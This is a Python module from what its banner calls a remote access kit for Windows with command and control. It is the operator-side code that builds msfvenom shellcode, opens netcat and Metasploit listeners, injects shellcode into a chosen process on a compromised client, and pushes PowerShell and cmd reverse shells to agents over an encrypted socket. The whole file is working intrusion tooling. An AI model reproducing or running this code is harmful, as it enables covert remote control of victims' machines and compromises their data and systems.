#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.2
# -------------------------------------------------------------
import os

from ..networking.socket import ServerSocket
from ..networking.receiver_socket import ReceiverSocket
from ..networking.IP_Handler import IPAddress
from ..client_handling.flags import ClientActionFlags
from ..logging.logging import DNSconfigs,LoggingUtilitys,NetworkingConfigs,ConsoleWindow
from ..client_handling.meterpreter_payloads import MSFPayload
from ..client_handling.payload_code import PayloadCode
from ..utils.file_paths import DSFilePath
from ..threading.threads import MultiThreading
from subprocess import run

"""
Define a class to handle python msf shellcode generation
"""
class MSFShellCode():
    #Function will generate shellcode with payload/IP/port passed as parameter
    #And output the shellcode to the shellcode data storage file
    def generate_shell_code(self,payload,lhost,lport):
        run(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f py -b '\\x00\\x0a\\x0d\\x20' -o {DSFilePath().msf_shellcode_file}",
            shell=True,
            capture_output=True)

"""
Define a class to handle listeners such as nc and meterpreter
"""
class ListenerHandler():
    #Function will open a netcat listener on port passed as parameter
    def open_netcat_listener(self,lport):
        run(f'gnome-terminal -e "nc -lvnp {str(lport)}"',shell=True,capture_output=True)    #Open new terminal with netcat listener on port that is passed as parameter

    #Function will open a meterpreter listener with payload and lport passed as parameter
    def open_meterpreter_listener(self,payload,lport):
        lhost = IPAddress().get_local_ip_from_interface()           #Get the local ip from the chosen interface
        run(f'gnome-terminal -e \'msfconsole -q -x "use multi/handler;set payload {payload};set lhost {lhost};set lport {lport};run"\'',shell=True,capture_output=True) #Open meterpreter listener

"""
Define a class that will prepare, send and catch an msf shell based on the payload
"""
class Meterpreter():

    #Function will send python meterpreter shellcode to client and open listener to catch connection
    def exec_python_meterpreter_shell(self,lport,encryption_key,client):
        domain = DNSconfigs().retrieve_domain_for_shell()           #Retrieve the domain chosen for shells
        shell_code = PayloadCode().staged_python_meterpreter(domain,lport)                              #Construct shellcode
        ListenerHandler().open_meterpreter_listener(MSFPayload().staged_python_meterpreter,lport)       #Open the listener
        data = str(f'{ClientActionFlags().exec_python_code}{ClientActionFlags().seperator}{shell_code}')#Prepare the data with the shell code
        ServerSocket().send_data_to_client(client,encryption_key,data)                                  #Send the data to the client for execution

    #Function will create msf shellcode and injection stub with PID as param then send it to the agent for execution
    def inject_msf_payload(self,payload,process_id,encryption_key,client):
        lhost = DNSconfigs().retrieve_domain_for_shell()                    #Get lhost string
        lport = NetworkingConfigs().retrieve_shell_lport()                  #Get lport string
        MSFShellCode().generate_shell_code(payload,lhost,lport)             #Generate the shellcode with the connection information
        msf_shellcode = LoggingUtilitys().retrieve_file_data(DSFilePath().msf_shellcode_file) #Retrieve the output file
        os.remove(DSFilePath().msf_shellcode_file)                          #Remove the shellcode file as it is no longer needed
        payload_code = PayloadCode().msf_shellcode_injector(                     #Generate the injection payload with the msf shellcode and process id number
            msf_shellcode,
            process_id
        )
        ListenerHandler().open_meterpreter_listener(payload,lport)
        data = f'{ClientActionFlags().exec_python_code}{ClientActionFlags().seperator}{payload_code}' #Set the data string for the client
        ServerSocket().send_data_to_client(client,encryption_key,data)                     #Tell the agent to inject the shellcode into the given pid

"""
Define a class to prepare send and catch powershell shells
"""
class SystemShell:

    #Function will execute a reverse shell using powershell
    def exec_reverse_shell(self,lport,encryption_key,client):
        lhost = DNSconfigs().retrieve_domain_for_shell()                                                        #Get the lhost from the config file
        shell_code = PayloadCode().reverse_powershell(lhost, lport)                                             #Prepare the shellcode
        ListenerHandler().open_netcat_listener(lport)                                                           #Open listener
        data = str(f'{ClientActionFlags().system_command}{ClientActionFlags().seperator}{shell_code}')          #Prepare the data
        ServerSocket().send_data_to_client(client,encryption_key,data)                                          #Send the data to the client for execution

    #Function will execute a cmd prompt type reverse shell
    def exec_cmd_shell(self,client,encryption_key):
        lhost = DNSconfigs().retrieve_domain_for_shell()                                                #Get the lhost string
        lport = NetworkingConfigs().retrieve_shell_lport()                                              #Get the lport string
        shellcode = PayloadCode().command_shell(lhost,lport)                                            #Create the code for the payload w/ the connection info
        ListenerHandler().open_netcat_listener(lport)                                                   #Open a listener handler on the lport
        data = str(f'{ClientActionFlags().exec_python_code}{ClientActionFlags().seperator}{shellcode}') #Create the data flag for the client
        ServerSocket().send_data_to_client(client,encryption_key,data)                                  #Send the flag to the client for processing